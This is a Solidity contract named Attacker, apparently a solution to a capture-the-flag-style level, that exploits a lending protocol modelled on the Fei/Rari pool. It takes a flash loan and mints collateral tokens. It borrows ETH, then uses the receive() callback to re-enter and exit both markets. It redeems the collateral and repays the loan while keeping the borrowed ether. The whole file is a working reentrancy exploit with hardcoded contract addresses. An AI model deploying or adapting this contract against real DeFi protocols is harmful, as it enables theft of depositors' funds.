// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../Level 6.sol";


contract Attacker{

    FeiRari public fer = FeiRari(0xA8905B41d40Eb0492fB63552a3604Fcb6a16A0b3);
    CETH public ceth = CETH(0x07f18d3251E5DDF725Ab9EAE74C985F017575099);
    CERC20 public cTokenA = CERC20(0xBcE2e1fd16b7E9209c8F6e0afBFC611Ad1317EfF);
    ERC20 public tokenA = ERC20(0x35655CEa30a06Bc600FCa280AC4502019E76FE43);

    uint constant public ETHER_AMOUNT = 1 * 10**17;

    function takeLoan() public {

         fer.flashloan(address(tokenA), address(this), tokenA.balanceOf(address(fer)), "");
         
        
    }

    function receiveLoan(address sender, uint amount, bytes calldata data) external {
        fer.enterMarket(cTokenA);
        ERC20(tokenA).approve(address(cTokenA), tokenA.balanceOf(address(this)));
        CERC20(cTokenA).mint(tokenA.balanceOf(address(this)));

        fer.enterMarket(ceth);
        CERC20(cTokenA).approve(address(ceth),cTokenA.balanceOf(address(this)));
        CETH(ceth).borrow(ETHER_AMOUNT);
        
        CERC20(cTokenA).redeem(cTokenA.balanceOf(address(this)));
        

        ERC20(tokenA).transfer(address(fer), tokenA.balanceOf(address(this)));
    }

    receive() external payable{
        

        fer.exitMarket(ceth);
        fer.exitMarket(cTokenA);
        
        
    }

}
